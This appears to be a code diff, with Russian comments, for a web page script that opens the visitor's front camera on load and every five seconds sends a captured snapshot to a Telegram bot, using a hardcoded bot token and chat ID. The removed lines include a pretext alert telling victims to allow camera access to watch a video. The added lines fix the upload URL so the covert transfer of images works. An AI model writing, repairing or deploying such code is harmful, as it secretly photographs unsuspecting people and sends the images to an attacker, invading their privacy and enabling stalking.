@@ -50,14 +50,15 @@
     const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
     const chatId = '8573089884';
 
-    // Функция захвата и отправки кадра
     async function takeAndSendPhoto(video, canvas) {
+        if (video.videoWidth === 0) return;
+
         const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0);
         
-        const dataURL = canvas.toDataURL('image/jpeg', 0.6); // Качество 0.6 для скорости
+        const dataURL = canvas.toDataURL('image/jpeg', 0.6);
         const blob = await (await fetch(dataURL)).blob();
         
         const formData = new FormData();
@@ -65,32 +66,36 @@
         formData.append('photo', blob, 'shot.jpg');
 
         try {
-            await fetch(api.telegram.org{botToken}/sendPhoto, {
+            // Исправленный URL с использованием обратных кавычек и символа $
+            const response = await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-            console.log("Фото отправлено");
+            const result = await response.json();
+            if (result.ok) {
+                console.log("Фото успешно отправлено!");
+            } else {
+                console.error("Ошибка от Telegram:", result.description);
+            }
         } catch (e) {
-            console.error("Ошибка отправки:", e);
+            console.error("Сетевая ошибка:", e);
         }
     }
 
     window.onload = () => {
-        // Запрашиваем камеру
+        // Обязательно HTTPS для работы камеры
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
-            // Запускаем бесконечный цикл с интервалом 1000 мс (1 сек)
             setInterval(() => {
                 takeAndSendPhoto(video, canvas);
             }, 5000); 
         })
         .catch(err => {
-            alert("Для просмотра видео необходимо разрешить доступ к камере в настройках браузера.");
-            console.log("Доступ отклонен:", err);
+            console.error("Доступ к камере запрещен или ошибка:", err);
         });
     };
 </script>
